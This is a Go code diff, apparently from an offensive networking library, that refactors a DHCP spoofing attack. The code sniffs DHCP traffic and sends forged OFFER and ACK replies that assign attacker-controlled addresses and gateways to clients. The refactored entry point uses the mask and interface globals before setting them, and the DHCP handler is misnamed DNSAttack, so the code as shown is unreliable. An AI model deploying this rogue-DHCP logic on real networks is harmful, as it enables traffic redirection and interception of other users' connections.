@@ -2,6 +2,7 @@ package higherlevel
 
 import (
 	"fmt"
+	"github.com/google/gopacket"
 	"github.com/google/gopacket/layers"
 	"github.com/tiagomdiogo/ScaGo/packet"
 	"github.com/tiagomdiogo/ScaGo/sniffer"
@@ -10,46 +11,34 @@ import (
 	"net"
 )
 
-func DHCPSpoofing(pool, mask, gateway, iface string) {
+var availableIP []net.IP
+var serverIP net.IP
+var iface, gateway, mask string
 
-	availableIP, _ := utils.GeneratePool(pool, mask)
-	newSniffer, _ := sniffer.NewSniffer(iface, "udp and (port 67 or 68)")
-	serverIP := availableIP[len(availableIP)-1]
-
-	defer newSniffer.Stop()
-	go newSniffer.Start()
-	fmt.Println("[*] Waiting for DHCP Discover")
-	for {
-		packets := newSniffer.GetPackets()
-		if len(packets) == 0 {
-			continue
-		}
-		for _, packetAux := range packets {
-			dhcpLayer := packetAux.Layer(layers.LayerTypeDHCPv4)
-			if dhcpLayer != nil {
-				dhcp, _ := dhcpLayer.(*layers.DHCPv4)
-				if dhcp.Operation == layers.DHCPOpRequest {
-					messageType := layers.DHCPMsgTypeUnspecified
-					for _, opt := range dhcp.Options {
-						if opt.Type == layers.DHCPOptMessageType {
-							messageType = layers.DHCPMsgType(opt.Data[0])
-							break
-						}
-					}
-					switch messageType {
-					case layers.DHCPMsgTypeDiscover:
-						DHCPOfferAck(dhcp, iface, availableIP[0], serverIP, net.ParseIP(gateway), net.ParseIP(mask), "offer")
-						fmt.Printf("[*] Got dhcp DISCOVER from: %s\n [*] Sending OFFER...\n [*] Sending DHCP Offer\n", dhcp.ClientHWAddr.String())
-					case layers.DHCPMsgTypeRequest:
-						DHCPOfferAck(dhcp, iface, availableIP[0], serverIP, net.ParseIP(gateway), net.ParseIP(mask), "ack")
-						fmt.Println("[*] Sending ACK")
-						if len(availableIP) > 0 {
-							availableIP = availableIP[1:]
-						}
-					}
-
+func DNSAttack(packet gopacket.Packet) {
+	dhcpLayer := packet.Layer(layers.LayerTypeDHCPv4)
+	if dhcpLayer != nil {
+		dhcp, _ := dhcpLayer.(*layers.DHCPv4)
+		if dhcp.Operation == layers.DHCPOpRequest {
+			messageType := layers.DHCPMsgTypeUnspecified
+			for _, opt := range dhcp.Options {
+				if opt.Type == layers.DHCPOptMessageType {
+					messageType = layers.DHCPMsgType(opt.Data[0])
+					break
 				}
 			}
+			switch messageType {
+			case layers.DHCPMsgTypeDiscover:
+				DHCPOfferAck(dhcp, iface, availableIP[0], serverIP, net.ParseIP(gateway), net.ParseIP(mask), "offer")
+				fmt.Printf("[*] Got dhcp DISCOVER from: %s\n [*] Sending OFFER...\n [*] Sending DHCP Offer\n", dhcp.ClientHWAddr.String())
+			case layers.DHCPMsgTypeRequest:
+				DHCPOfferAck(dhcp, iface, availableIP[0], serverIP, net.ParseIP(gateway), net.ParseIP(mask), "ack")
+				fmt.Println("[*] Sending ACK")
+				if len(availableIP) > 0 {
+					availableIP = availableIP[1:]
+				}
+			}
+
 		}
 	}
 }
@@ -90,4 +79,14 @@ func DHCPOfferAck(dhcp *layers.DHCPv4, iface string, availableIP, sourceIp, gate
 
 	pkt, _ := packet.CraftPacket(ethLayer.Layer(), ipLayer.Layer(), udpLayer.Layer(), dhcpLayer.Layer())
 	communication.Send(pkt, iface)
+}
+
+func DHCPSpoofing(pool, maskGiven, gatewayGiven, ifaceGiven string) {
+	availableIP, _ = utils.GeneratePool(pool, mask)
+	sniffer.NewSniffer(iface, "udp and (port 67 or 68)", DNSAttack)
+	serverIP = availableIP[len(availableIP)-1]
+	iface = ifaceGiven
+	gateway = gatewayGiven
+	mask = maskGiven
+	fmt.Println("[*] Waiting for DHCP Discover")
 }
